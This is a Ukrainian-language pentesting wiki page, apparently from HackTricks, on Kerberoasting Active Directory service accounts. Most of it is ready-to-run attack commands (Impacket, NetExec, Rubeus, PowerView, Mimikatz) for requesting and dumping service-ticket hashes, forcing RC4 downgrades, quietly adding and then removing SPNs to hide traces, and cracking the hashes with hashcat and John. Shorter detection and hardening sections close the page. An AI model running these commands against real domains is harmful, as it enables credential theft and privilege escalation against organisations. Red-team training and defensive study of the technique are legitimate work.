# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting зосереджується на отриманні TGS tickets, зокрема тих, що стосуються служб, які працюють під обліковими записами користувачів в Active Directory (AD), за винятком облікових записів комп’ютерів. Для шифрування цих tickets використовуються ключі, похідні від паролів користувачів, що дає змогу виконувати offline cracking облікових даних. На використання облікового запису користувача як службового вказує непорожня властивість ServicePrincipalName (SPN).

Будь-який автентифікований користувач домену може запитувати TGS tickets, тож спеціальні привілеї не потрібні.<sup>[[4]](#references)[[5]](#references)</sup>

### Ключові моменти

- Ціллю є TGS tickets для служб, що працюють під обліковими записами користувачів (тобто обліковими записами з установленим SPN; не обліковими записами комп’ютерів).
- Tickets зашифровані ключем, похідним від пароля службового облікового запису, і їх можна зламувати offline.
- Підвищені привілеї не потрібні; будь-який автентифікований обліковий запис може запитувати TGS tickets.

> [!WARNING]
> Більшість публічних інструментів надають перевагу запиту service tickets з RC4-HMAC (etype 23), оскільки їх швидше зламувати, ніж AES. RC4 TGS hashes починаються з `$krb5tgs$23$*`, AES128 — з `$krb5tgs$17$*`, а AES256 — з `$krb5tgs$18$*`. Однак багато середовищ переходять на використання лише AES. Не вважайте, що важливий лише RC4.
> Також уникайте Kerberoasting за принципом «розпорошити й сподіватися». Стандартна команда kerberoast у Rubeus може шукати й запитувати tickets для всіх SPN, створюючи багато шуму. Спочатку перераховуйте об’єкти й націлюйтеся на цікаві principals.

### Секрети службових облікових записів і вартість криптографії Kerberos

Багато служб досі працюють під обліковими записами користувачів із паролями, якими керують вручну. KDC шифрує service tickets ключами, похідними від цих паролів, і передає ciphertext будь-якому автентифікованому principal, тож Kerberoasting дає змогу необмежено підбирати паролі offline без блокувань облікових записів чи телеметрії DC. Режим шифрування визначає обсяг ресурсів, потрібних для cracking:

| Режим | Похідний ключ | Тип шифрування | Орієнтовна швидкість RTX 5090* | Примітки |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 із 4 096 ітераціями та сіллю для кожного principal, згенерованою на основі домену й SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 мільйона спроб/с | Сіль унеможливлює використання rainbow tables, але короткі паролі все одно можна швидко зламати. |
| RC4 + NT hash | Один MD4 від пароля (несолений NT hash); Kerberos додає до кожного ticket лише 8-байтовий confounder | etype 23 (`$krb5tgs$23$`) | ~4,18 **мільярда** спроб/с | Приблизно у 1000 разів швидше за AES; зловмисники примусово використовують RC4, якщо це дозволяє `msDS-SupportedEncryptionTypes`. |

*Показники Chick3nman, наведені в [аналізі Kerberoasting від Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder у RC4 лише рандомізує keystream; він не збільшує обсяг роботи для кожної спроби. Якщо службові облікові записи не використовують випадкові секрети (gMSA/dMSA, облікові записи комп’ютерів або рядки, якими керує vault), швидкість компрометації залежить лише від обчислювальних ресурсів GPU. Примусове використання лише AES etypes усуває downgrade, що дозволяє мільярди спроб за секунду, але слабкі людські паролі все одно можна зламати за допомогою PBKDF2.<sup>[[3]](#references)</sup>

### Атака

#### Linux

Практичний приклад повного циклу з NetExec для запиту tickets, придатних для roasting, і Hashcat для їх cracking наведено в джерелі [1].<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Багатофункціональні інструменти, що включають перевірки kerberoast:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Виявити користувачів, які піддаються Kerberoasting

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Техніка 1: Запросити TGS і виконати dump з пам’яті

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Техніка 2: автоматизовані інструменти

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Запит TGS генерує подію Windows Security 4769 (було запитано сервісний квиток Kerberos).

### OPSEC та середовища лише з AES

- Навмисно запитуйте RC4 для облікових записів без AES:
  - Rubeus: `/rc4opsec` використовує tgtdeleg для переліку облікових записів без AES і запитує сервісні квитки RC4.
  - Rubeus: `/tgtdeleg` разом із kerberoast також ініціює запити RC4, де це можливо.<sup>[[6]](#references)</sup>
- Виконуйте Roast облікових записів, для яких доступний лише AES, замість того щоб мовчки завершуватися з помилкою:
  - Rubeus: `/aes` перелічує облікові записи з увімкненим AES і запитує сервісні квитки AES (etype 17/18).
  - Якщо у вас уже є TGT (PTT або з .kirbi), можна використовувати `/ticket:<blob|path>` разом із `/spn:<SPN>` або `/spns:<file>` і пропустити LDAP.
- Вибір цілей, обмеження частоти запитів і зменшення шуму:
  - Використовуйте `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` і `/jitter:<1-100>`.
  - Фільтруйте облікові записи з імовірно слабкими паролями за допомогою `/pwdsetbefore:<MM-dd-yyyy>` (старіші паролі) або націлюйтеся на привілейовані OU за допомогою `/ou:<DN>`.<sup>[[8]](#references)</sup>

Приклади (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Закріплення / зловживання

Якщо ви контролюєте обліковий запис або можете його змінити, можна зробити його вразливим до Kerberoasting, додавши SPN:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Знизьте рівень облікового запису, щоб увімкнути RC4 для простішого cracking (потрібні права на запис до цільового об’єкта):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast через GenericWrite/GenericAll над користувачем (тимчасовий SPN)

Якщо BloodHound показує, що ви контролюєте об’єкт користувача (наприклад, маєте GenericWrite/GenericAll), ви можете надійно виконати “targeted-roast” саме цього користувача, навіть якщо наразі в нього немає SPN:<sup>[[9]](#references)</sup>

- Додайте тимчасовий SPN до контрольованого користувача, щоб він став придатним для roast.
- Запросіть TGS-REP, зашифрований RC4 (etype 23), для цього SPN, щоб підвищити шанси на злам.
- Зламайте хеш `$krb5tgs$23$...` за допомогою hashcat.
- Видаліть SPN, щоб зменшити сліди.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Однорядкова команда для Linux (targetedKerberoast.py автоматизує додавання SPN -> запит TGS (etype 23) -> видалення SPN):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Зламайте отриманий хеш за допомогою автоматичного визначення hashcat (режим 13100 для `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Нотатки щодо виявлення: додавання/видалення SPN спричиняє зміни в каталозі (Event ID 5136/4738 для цільового користувача), а запит TGS генерує Event ID 4769. Розгляньте можливість обмеження частоти запитів і якнайшвидшого очищення слідів.

Корисні інструменти для атак Kerberoast можна знайти тут: https://github.com/nidem/kerberoast

Якщо в Linux ви бачите цю помилку: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, це спричинено розбіжністю локального часу. Синхронізуйте час із DC:

- `ntpdate <DC_IP>` (у деяких дистрибутивах застаріла)
- `rdate -n <DC_IP>`

### Kerberoast без облікового запису домену (AS-requested STs)

У вересні 2022 року Charlie Clark показав, що якщо для principal не потрібна попередня автентифікація, можна отримати service ticket за допомогою сформованого KRB_AS_REQ, змінивши sname у тілі запиту, і фактично отримати service ticket замість TGT. Це схоже на AS-REP roasting і не потребує дійсних облікових даних домену.

Докладніше: стаття Semperis «New Attack Paths: AS-requested STs».<sup>[[10]](#references)</sup>

> [!WARNING]
> Потрібно надати список користувачів, оскільки без дійсних облікових даних за допомогою цієї техніки неможливо виконати запит до LDAP.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Пов’язане

Якщо ви націлюєтеся на користувачів, вразливих до AS-REP roasting, дивіться також:

{{#ref}}
asreproast.md
{{#endref}}

### Виявлення

Kerberoasting може бути непомітним. Шукайте Event ID 4769 на DC і застосовуйте фільтри, щоб зменшити кількість хибних спрацювань:

- Виключіть ім’я служби `krbtgt` та імена служб, що закінчуються на `$` (облікові записи комп’ютерів).
- Виключіть запити від облікових записів машин (`*$$@*`).
- Лише успішні запити (Failure Code `0x0`).
- Відстежуйте типи шифрування: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Не створюйте сповіщення лише для `0x17`.

Приклад первинного аналізу за допомогою PowerShell:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Additional ideas:

- Визначте базовий рівень звичайного використання SPN для кожного хоста/користувача; сповіщайте про великі сплески запитів до різних SPN від одного principal.
- Позначайте незвичне використання RC4 у доменах із посиленим AES.

### Mitigation / Hardening

- Використовуйте gMSA/dMSA або облікові записи комп’ютерів для служб. Керовані облікові записи мають випадкові паролі довжиною понад 120 символів і автоматично змінюють їх, що робить офлайн-злам непрактичним.<sup>[[7]](#references)</sup>
- Примусово використовуйте AES для облікових записів служб, задавши `msDS-SupportedEncryptionTypes` лише для AES (десяткове значення 24 / шістнадцяткове 0x18), а потім змініть пароль, щоб сформувати ключі AES.<sup>[[7]](#references)</sup>
- За можливості вимкніть RC4 у своєму середовищі та відстежуйте спроби його використання. На DC можна використовувати значення реєстру `DefaultDomainSupportedEncTypes`, щоб задати параметри за замовчуванням для облікових записів, у яких не встановлено `msDS-SupportedEncryptionTypes`. Ретельно протестуйте.
- Видаліть непотрібні SPN з облікових записів користувачів.<sup>[[7]](#references)</sup>
- Якщо керовані облікові записи недоступні, використовуйте для облікових записів служб довгі випадкові паролі (від 25 символів); блокуйте поширені паролі та регулярно проводьте аудит.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – практичний приклад Kerberoast через LDAP у NetExec і злому хешів за допомогою hashcat](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: низькотехнологічні атаки з високим впливом на основі застарілої криптографії Kerberos (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): як атакувати Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – зловживання Kerberos в Active Directory: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: запит TGS, зашифрованого RC4, коли AES увімкнено](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – рекомендації Microsoft щодо пом’якшення ризиків Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – документація команди Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — облікові дані SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync до DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – нові шляхи атак? AS Requested Service Tickets (Charlie Clark, вересень 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
